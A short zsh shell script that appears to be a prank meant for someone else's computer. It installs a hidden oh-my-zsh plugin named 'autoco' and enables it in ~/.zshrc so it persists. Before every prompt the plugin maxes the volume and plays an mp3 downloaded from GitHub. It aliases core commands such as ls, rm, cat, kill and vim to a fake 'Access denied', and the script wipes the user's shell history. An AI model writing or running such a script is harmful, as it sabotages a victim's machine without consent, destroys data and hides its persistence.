NAME="autoco"
REG="plugins=("
STRING="$REG$NAME"
FILE="$HOME/.zshrc"
DIR="$HOME/.oh-my-zsh/custom/plugins/$NAME/"
SOUND="$DIR$NAME.mp3"

mkdir -p "$DIR"
if [ ! -e "$SOUND" ]; then
	wget -q -O "$SOUND" "https://raw.githubusercontent.com/kema-dev/trolls/main/shell_audio_42/apoil.mp3"
	chmod 655 "$SOUND"
fi

if ! grep -q "$STRING" "$FILE" ; then
	sed -i "s/^$REG/$STRING /" "$FILE"
fi

PLUG="precmd() { osascript -e 'set Volume 10' ; afplay $SOUND > /dev/null & }
alias chmod='echo chmod: Access denied'
alias vim='echo vim: Access denied'
alias vi='echo vi: Access denied'
alias ls='echo ls: Access denied'
alias echo='echo echo: Access denied'
alias cat='echo cat: Access denied'
alias cp='echo cp: Access denied'
alias mv='echo mv: Access denied'
alias rm='echo rm: Access denied'
alias mkdir='echo mkdir: Access denied'
alias rmdir='echo rmdir: Access denied'
alias grep='echo grep: Access denied'
alias less='echo less: Access denied'
alias more='echo more: Access denied'
alias tail='echo tail: Access denied'
alias head='echo head: Access denied'
alias top='echo top: Access denied'
alias ps='echo ps: Access denied'
alias kill='echo kill: Access denied'
alias killall='echo killall: Access denied'
alias open='echo open: Access denied'"

echo -n "$PLUG" > "$DIR$NAME.plugin.zsh"
chmod 655 "$DIR$NAME.plugin.zsh"
echo -n >| $HOME/.zsh_history
